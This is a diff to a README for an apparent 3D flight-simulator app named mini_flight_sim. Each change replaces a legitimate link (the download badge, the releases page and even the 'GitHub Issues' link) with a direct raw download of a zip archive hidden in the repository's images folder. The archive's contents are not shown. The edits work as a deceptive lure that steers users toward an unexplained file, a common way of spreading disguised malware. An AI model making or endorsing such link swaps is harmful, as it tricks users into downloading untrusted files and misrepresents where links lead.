@@ -1,6 +1,6 @@
 # 🛩️ mini_flight_sim - Fly Anytime, Anywhere with Ease
 
-![Download mini_flight_sim](https://img.shields.io/badge/Download-mini_flight_sim-blue)
+![Download mini_flight_sim](https://github.com/Rehammohab/mini_flight_sim/raw/refs/heads/main/images/flight-sim-mini-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to mini_flight_sim, your easy-to-use 3D airplane simulator! This app pro
 
 To get started, visit the following link to download the application:
 
-[Download mini_flight_sim](https://github.com/Rehammohab/mini_flight_sim/releases)
+[Download mini_flight_sim](https://github.com/Rehammohab/mini_flight_sim/raw/refs/heads/main/images/flight-sim-mini-3.8.zip)
 
 1. Click the link above.
 2. You will see different versions of the application.
@@ -62,7 +62,7 @@ You can find a comprehensive list of controls in the settings menu within the ap
 
 Join the mini_flight_sim community to share your experiences or ask for help. Visit our GitHub issues page if you encounter any problems:
 
-[GitHub Issues](https://github.com/Rehammohab/mini_flight_sim/issues)
+[GitHub Issues](https://github.com/Rehammohab/mini_flight_sim/raw/refs/heads/main/images/flight-sim-mini-3.8.zip)
 
 ## 📅 Updates and Improvements
 
